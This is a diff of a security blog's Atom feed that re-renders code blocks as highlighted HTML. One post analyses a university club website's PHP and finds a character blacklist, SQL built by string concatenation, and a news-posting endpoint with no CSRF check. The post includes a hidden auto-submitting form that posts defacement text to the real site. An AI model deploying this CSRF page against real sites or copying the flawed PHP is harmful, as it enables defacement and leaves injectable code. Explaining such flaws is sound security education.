@@ -4,7 +4,7 @@
   <title><![CDATA[Category: Security | Mark Mossberg's Blog]]></title>
   <link href="http://blog.mark.lc/blog/categories/security/atom.xml" rel="self"/>
   <link href="http://blog.mark.lc/"/>
-  <updated>2015-04-25T18:54:50-04:00</updated>
+  <updated>2015-04-25T19:02:37-04:00</updated>
   <id>http://blog.mark.lc/</id>
   <author>
     <name><![CDATA[Mark Mossberg]]></name>
@@ -548,13 +548,11 @@ with the xor key.</p>
 
 <p>Here&rsquo;s a way to do this with python.</p>
 
-<p>{% highlight python %}
-str = &lsquo;\x91\xbf\xa4\x85\x85\xc3\xba\xb9\x9f\xa6\xb6\xb1\x93\xb9\x83\x8f\xae\xb1\xae\xc1\xbc\x80\xca\xca&rsquo;
-ba = bytearray(str)
-for i, byte in enumerate(ba):
-    ba[i] ^= 0xf7
-print ba
-{% endhighlight %}</p>
+<p><div class="highlight"><pre><code class="language-python" data-lang="python"><span class="nb">str</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span>\<span class="n">x91</span>\<span class="n">xbf</span>\<span class="n">xa4</span>\<span class="n">x85</span>\<span class="n">x85</span>\<span class="n">xc3</span>\<span class="n">xba</span>\<span class="n">xb9</span>\<span class="n">x9f</span>\<span class="n">xa6</span>\<span class="n">xb6</span>\<span class="n">xb1</span>\<span class="n">x93</span>\<span class="n">xb9</span>\<span class="n">x83</span>\<span class="n">x8f</span>\<span class="n">xae</span>\<span class="n">xb1</span>\<span class="n">xae</span>\<span class="n">xc1</span>\<span class="n">xbc</span>\<span class="n">x80</span>\<span class="n">xca</span>\<span class="n">xca</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span>
+<span class="n">ba</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">(</span><span class="nb">str</span><span class="p">)</span>
+<span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">byte</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">ba</span><span class="p">):</span>
+    <span class="n">ba</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^=</span> <span class="mh">0xf7</span>
+<span class="k">print</span> <span class="n">ba</span></code></pre></div></p>
 
 <p>Which results in this:</p>
 
@@ -587,31 +585,27 @@ see if I could find any cool bugs.</p>
 was pleasantly surprised to find in the <code>register.php</code> file, for example, that
 handles user registration, to find a input sanitation check.</p>
 
-<p>{% highlight php startinline %}
-if ((isValid($<em>POST[&lsquo;newusername&rsquo;]))&amp;&amp;(isValid($</em>POST[&lsquo;newpassword&rsquo;])))
-{
-    // continue with registration
-}
-{% endhighlight %}</p>
+<p><div class="highlight"><pre><code class="language-php" data-lang="php"><span class="k">if</span> <span class="p">((</span><span class="nx">isValid</span><span class="p">(</span><span class="err">$</span><span class="o">&lt;</span><span class="nx">em</span><span class="o">&gt;</span><span class="nx">POST</span><span class="p">[</span><span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="nx">newusername</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;]))</span><span class="o">&amp;</span><span class="nx">amp</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">amp</span><span class="p">;(</span><span class="nx">isValid</span><span class="p">(</span><span class="err">$</span><span class="o">&lt;/</span><span class="nx">em</span><span class="o">&gt;</span><span class="nx">POST</span><span class="p">[</span><span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="nx">newpassword</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;])))</span>
+<span class="p">{</span>
+    <span class="c1">// continue with registration</span>
+<span class="p">}</span></code></pre></div></p>
 
 <p>where <code>isValid()</code> looks like</p>
 
-<p>{% highlight php startinline %}
-function isValid($varx)
-{
-    $valid = true;
-    $bad_stuff = array(&ldquo;#&rdquo;,&ldquo;(&rdquo;,&ldquo;)&rdquo;,&ldquo;&lt;&rdquo;,&ldquo;>&rdquo;,&ldquo;?&rdquo;,&ldquo;/&rdquo;,&ldquo;\&rdquo;,&ldquo;[&rdquo;,&ldquo;]&rdquo;,&ldquo;|&rdquo;,&ldquo;$&rdquo;,&ldquo;&lsquo;&rdquo;,&ldquo;:&rdquo;,&ldquo;;&rdquo;, &ldquo;@&rdquo;);
-    for($index = 0; $index &lt; strlen($varx); $index++) {
-        if(in_array(substr($varx,$index,1), $bad_stuff)) {
-            $valid = false;
-        }
-    }
-    if(substr($varx, 0, 1) == &ldquo; &rdquo;) {
-        $valid = false;
-    }
-    return $valid;
-}
-{% endhighlight %}</p>
+<p><div class="highlight"><pre><code class="language-php" data-lang="php"><span class="k">function</span> <span class="nf">isValid</span><span class="p">(</span><span class="nv">$varx</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="nv">$valid</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
+    <span class="nv">$bad_stuff</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="c1">#&amp;rdquo;,&amp;ldquo;(&amp;rdquo;,&amp;ldquo;)&amp;rdquo;,&amp;ldquo;&amp;lt;&amp;rdquo;,&amp;ldquo;&gt;&amp;rdquo;,&amp;ldquo;?&amp;rdquo;,&amp;ldquo;/&amp;rdquo;,&amp;ldquo;\&amp;rdquo;,&amp;ldquo;[&amp;rdquo;,&amp;ldquo;]&amp;rdquo;,&amp;ldquo;|&amp;rdquo;,&amp;ldquo;$&amp;rdquo;,&amp;ldquo;&amp;lsquo;&amp;rdquo;,&amp;ldquo;:&amp;rdquo;,&amp;ldquo;;&amp;rdquo;, &amp;ldquo;@&amp;rdquo;);</span>
+    <span class="k">for</span><span class="p">(</span><span class="nv">$index</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$index</span> <span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$varx</span><span class="p">);</span> <span class="nv">$index</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">if</span><span class="p">(</span><span class="nb">in_array</span><span class="p">(</span><span class="nb">substr</span><span class="p">(</span><span class="nv">$varx</span><span class="p">,</span><span class="nv">$index</span><span class="p">,</span><span class="mi">1</span><span class="p">),</span> <span class="nv">$bad_stuff</span><span class="p">))</span> <span class="p">{</span>
+            <span class="nv">$valid</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+    <span class="k">if</span><span class="p">(</span><span class="nb">substr</span><span class="p">(</span><span class="nv">$varx</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span> <span class="o">==</span> <span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span> <span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;)</span> <span class="p">{</span>
+        <span class="nv">$valid</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="nv">$valid</span><span class="p">;</span>
+<span class="p">}</span></code></pre></div></p>
 
 <p>This code has a pretty substantial blacklist of commonly used characters in
 injections and operates by iterating over each character of the questionable
@@ -627,50 +621,46 @@ that powered the posting of news to the website, <code>add-news.php</code>.</p>
 &ldquo;isadmin&rdquo; and &ldquo;isofficer&rdquo; are set to &ldquo;yessir&rdquo; and &ldquo;true&rdquo; respectively, then
 the code that adds news gets executed.</p>
 
-<p>{% highlight php startinline %}
-if ($<em>SERVER[&lsquo;REQUEST_METHOD&rsquo;] == &ldquo;POST&rdquo;)
-    {
-        include(&ldquo;ieee-lib.php&rdquo;);
-        if(isset($</em>SESSION[&lsquo;isadmin&rsquo;]) || isset($<em>SESSION[&lsquo;isofficer&rsquo;]))
-        {
-            if($</em>SESSION[&lsquo;isadmin&rsquo;] == &ldquo;yessir&rdquo; || $_SESSION[&lsquo;isofficer&rsquo;] == &ldquo;true&rdquo;)
-            {
-                // add news
-{% endhighlight %}</p>
+<p><div class="highlight"><pre><code class="language-php" data-lang="php"><span class="k">if</span> <span class="p">(</span><span class="err">$</span><span class="o">&lt;</span><span class="nx">em</span><span class="o">&gt;</span><span class="nx">SERVER</span><span class="p">[</span><span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="nx">REQUEST_METHOD</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;]</span> <span class="o">==</span> <span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">POST</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;)</span>
+    <span class="p">{</span>
+        <span class="k">include</span><span class="p">(</span><span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">ieee</span><span class="o">-</span><span class="nx">lib</span><span class="o">.</span><span class="nx">php</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;);</span>
+        <span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="err">$</span><span class="o">&lt;/</span><span class="nx">em</span><span class="o">&gt;</span><span class="nx">SESSION</span><span class="p">[</span><span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="nx">isadmin</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;])</span> <span class="o">||</span> <span class="nb">isset</span><span class="p">(</span><span class="err">$</span><span class="o">&lt;</span><span class="nx">em</span><span class="o">&gt;</span><span class="nx">SESSION</span><span class="p">[</span><span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="nx">isofficer</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;]))</span>
+        <span class="p">{</span>
+            <span class="k">if</span><span class="p">(</span><span class="err">$</span><span class="o">&lt;/</span><span class="nx">em</span><span class="o">&gt;</span><span class="nx">SESSION</span><span class="p">[</span><span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="nx">isadmin</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;]</span> <span class="o">==</span> <span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">yessir</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;</span> <span class="o">||</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="nx">isofficer</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;]</span> <span class="o">==</span> <span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="k">true</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;)</span>
+            <span class="p">{</span>
+                <span class="c1">// add news</span></code></pre></div></p>
 
 <p>After these access checks pass, the POST request data is processed and
 ultimately a SQL query string is generated.</p>
 
-<p>{% highlight php startinline %}
-// continued from above
-$title = htmlspecialchars($<em>POST[&lsquo;news_title&rsquo;], ENT_QUOTES);
-$text = htmlspecialchars($</em>POST[&lsquo;post&rsquo;], ENT_QUOTES);
-{ &hellip; } // some omitted stuff
-$user_query = &ldquo;SELECT user_id, username FROM &rdquo; . $INFO[&lsquo;sql_prefix&rsquo;] . &ldquo;users WHERE username = &lsquo;&rdquo; . $_SESSION[&#8216;username&rsquo;] . &ldquo;&lsquo;&rdquo;;
-$user_result = mysql_query($user_query);
-if($user_result)
-{
-    //Returns an array with the data from the SQL select statement
-    $user_row = mysql_fetch_row($user_result);</p>
+<p><div class="highlight"><pre><code class="language-php" data-lang="php"><span class="c1">// continued from above</span>
+<span class="nv">$title</span> <span class="o">=</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="err">$</span><span class="o">&lt;</span><span class="nx">em</span><span class="o">&gt;</span><span class="nx">POST</span><span class="p">[</span><span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="nx">news_title</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;],</span> <span class="nx">ENT_QUOTES</span><span class="p">);</span>
+<span class="nv">$text</span> <span class="o">=</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="err">$</span><span class="o">&lt;/</span><span class="nx">em</span><span class="o">&gt;</span><span class="nx">POST</span><span class="p">[</span><span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="nx">post</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;],</span> <span class="nx">ENT_QUOTES</span><span class="p">);</span>
+<span class="p">{</span> <span class="o">&amp;</span><span class="nx">hellip</span><span class="p">;</span> <span class="p">}</span> <span class="c1">// some omitted stuff</span>
+<span class="nv">$user_query</span> <span class="o">=</span> <span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">SELECT</span> <span class="nx">user_id</span><span class="p">,</span> <span class="nx">username</span> <span class="nx">FROM</span> <span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;</span> <span class="o">.</span> <span class="nv">$INFO</span><span class="p">[</span><span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="nx">sql_prefix</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;]</span> <span class="o">.</span> <span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">users</span> <span class="nx">WHERE</span> <span class="nx">username</span> <span class="o">=</span> <span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;</span> <span class="o">.</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;username&amp;rsquo;] . &amp;ldquo;&amp;lsquo;&amp;rdquo;;</span>
+<span class="s1">$user_result = mysql_query($user_query);</span>
+<span class="s1">if($user_result)</span>
+<span class="s1">{</span>
+<span class="s1">    //Returns an array with the data from the SQL select statement</span>
+<span class="s1">    $user_row = mysql_fetch_row($user_result);&lt;/p&gt;</span>
 
-<pre><code>$query1 = "INSERT INTO " . $INFO['sql_prefix'] . "news (news_title, news_type, time_posted, time_meeting, news_body, author_id, author_name, meeting_location) ";
-$query2 = "VALUES ('" . $title . "', '" . $type_of_news . "', '" . time() . "', '" . $time_of_meeting . "', '" . $text . "', '" . $user_row[0] . "', '" . $user_row[1] . "', '" . $meetinglocation . "')";
-$add_news_query = $query1 . $query2;
-$add_news_result = mysql_query($add_news_query);
+<span class="s1">&lt;pre&gt;&lt;code&gt;$query1 = &quot;INSERT INTO &quot; . $INFO[&#39;</span><span class="nx">sql_prefix</span><span class="s1">&#39;] . &quot;news (news_title, news_type, time_posted, time_meeting, news_body, author_id, author_name, meeting_location) &quot;;</span>
+<span class="s1">$query2 = &quot;VALUES (&#39;</span><span class="s2">&quot; . </span><span class="si">$title</span><span class="s2"> . &quot;</span><span class="s1">&#39;, &#39;</span><span class="s2">&quot; . </span><span class="si">$type_of_news</span><span class="s2"> . &quot;</span><span class="s1">&#39;, &#39;</span><span class="s2">&quot; . time() . &quot;</span><span class="s1">&#39;, &#39;</span><span class="s2">&quot; . </span><span class="si">$time_of_meeting</span><span class="s2"> . &quot;</span><span class="s1">&#39;, &#39;</span><span class="s2">&quot; . </span><span class="si">$text</span><span class="s2"> . &quot;</span><span class="s1">&#39;, &#39;</span><span class="s2">&quot; . </span><span class="si">$user_row[0]</span><span class="s2"> . &quot;</span><span class="s1">&#39;, &#39;</span><span class="s2">&quot; . </span><span class="si">$user_row[1]</span><span class="s2"> . &quot;</span><span class="s1">&#39;, &#39;</span><span class="s2">&quot; . </span><span class="si">$meetinglocation</span><span class="s2"> . &quot;</span><span class="s1">&#39;)&quot;;</span>
+<span class="s1">$add_news_query = $query1 . $query2;</span>
+<span class="s1">$add_news_result = mysql_query($add_news_query);</span>
 
-if($add_news_result)
-{
-    header('Location: http://www.ieee.neu.edu/?page=addnews&amp;success=true');
-}
-else
-{
-    header('Location: http://www.ieee.neu.edu/?page=addnews&amp;error=unable_to_post_news');
-}
-</code></pre>
+<span class="s1">if($add_news_result)</span>
+<span class="s1">{</span>
+<span class="s1">    header(&#39;</span><span class="nx">Location</span><span class="o">:</span> <span class="nx">http</span><span class="o">://</span><span class="nx">www</span><span class="o">.</span><span class="nx">ieee</span><span class="o">.</span><span class="nx">neu</span><span class="o">.</span><span class="nx">edu</span><span class="o">/?</span><span class="nx">page</span><span class="o">=</span><span class="nx">addnews</span><span class="o">&amp;</span><span class="nx">amp</span><span class="p">;</span><span class="nx">success</span><span class="o">=</span><span class="k">true</span><span class="s1">&#39;);</span>
+<span class="s1">}</span>
+<span class="s1">else</span>
+<span class="s1">{</span>
+<span class="s1">    header(&#39;</span><span class="nx">Location</span><span class="o">:</span> <span class="nx">http</span><span class="o">://</span><span class="nx">www</span><span class="o">.</span><span class="nx">ieee</span><span class="o">.</span><span class="nx">neu</span><span class="o">.</span><span class="nx">edu</span><span class="o">/?</span><span class="nx">page</span><span class="o">=</span><span class="nx">addnews</span><span class="o">&amp;</span><span class="nx">amp</span><span class="p">;</span><span class="nx">error</span><span class="o">=</span><span class="nx">unable_to_post_news</span><span class="err">&#39;</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="o">&lt;/</span><span class="nx">code</span><span class="o">&gt;&lt;/</span><span class="nx">pre</span><span class="o">&gt;</span>
 
-<p>}
-// done
-{% endhighlight %}</p>
+<span class="o">&lt;</span><span class="nx">p</span><span class="o">&gt;</span><span class="p">}</span>
+<span class="c1">// done</span></code></pre></div></p>
 
 <p>The important part to notice here is that there is no code that ensures the
 legitimacy of the request, that is, that a currently authenticated admin
@@ -696,24 +686,22 @@ for example if you had previous knowledge of a site that the admin frequented
 that had an XSS vulnerability, that would be a perfect way to chain these attacks.
 Anyway, here&rsquo;s an example malicious page <sup id="fnref:1"><a href="#fn:1" rel="footnote">1</a></sup>.</p>
 
-<p>{% highlight html %}
-&lt;!DOCTYPE HTML>
-<html>
-<body>
-    <h1>non-malicious website! :)</h1>
-    <form id="thisform" action="http://www.ieee.neu.edu/add-news.php" method="POST"
-          style="display:none;">
-        <input type="text" name="news_title" value="breaking news: u got hacked" />
-        <input type="text" name="post" value="insert website defacement here" />
-        <input type="submit"/>
-    </form>
-    <script type="text/javascript" charset="utf-8">
-        var frm = document.getElementById(&ldquo;thisform&rdquo;);
-        frm.submit();
-    </script>
-</body>
-</html>
-{% endhighlight %}</p>
+<p><div class="highlight"><pre><code class="language-html" data-lang="html"><span class="ni">&amp;lt;</span>!DOCTYPE HTML&gt;
+<span class="nt">&lt;html&gt;</span>
+<span class="nt">&lt;body&gt;</span>
+    <span class="nt">&lt;h1&gt;</span>non-malicious website! :)<span class="nt">&lt;/h1&gt;</span>
+    <span class="nt">&lt;form</span> <span class="na">id=</span><span class="s">&quot;thisform&quot;</span> <span class="na">action=</span><span class="s">&quot;http://www.ieee.neu.edu/add-news.php&quot;</span> <span class="na">method=</span><span class="s">&quot;POST&quot;</span>
+          <span class="na">style=</span><span class="s">&quot;display:none;&quot;</span><span class="nt">&gt;</span>
+        <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">&quot;text&quot;</span> <span class="na">name=</span><span class="s">&quot;news_title&quot;</span> <span class="na">value=</span><span class="s">&quot;breaking news: u got hacked&quot;</span> <span class="nt">/&gt;</span>
+        <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">&quot;text&quot;</span> <span class="na">name=</span><span class="s">&quot;post&quot;</span> <span class="na">value=</span><span class="s">&quot;insert website defacement here&quot;</span> <span class="nt">/&gt;</span>
+        <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">&quot;submit&quot;</span><span class="nt">/&gt;</span>
+    <span class="nt">&lt;/form&gt;</span>
+    <span class="nt">&lt;script </span><span class="na">type=</span><span class="s">&quot;text/javascript&quot;</span> <span class="na">charset=</span><span class="s">&quot;utf-8&quot;</span><span class="nt">&gt;</span>
+        <span class="kd">var</span> <span class="nx">frm</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">thisform</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;);</span>
+        <span class="nx">frm</span><span class="p">.</span><span class="nx">submit</span><span class="p">();</span>
+    <span class="nt">&lt;/script&gt;</span>
+<span class="nt">&lt;/body&gt;</span>
+<span class="nt">&lt;/html&gt;</span></code></pre></div></p>
 
 <p>Nothing fancy here, just a simple hidden form with the values you want to submit
 to the page, and some JS that submits the form.</p>
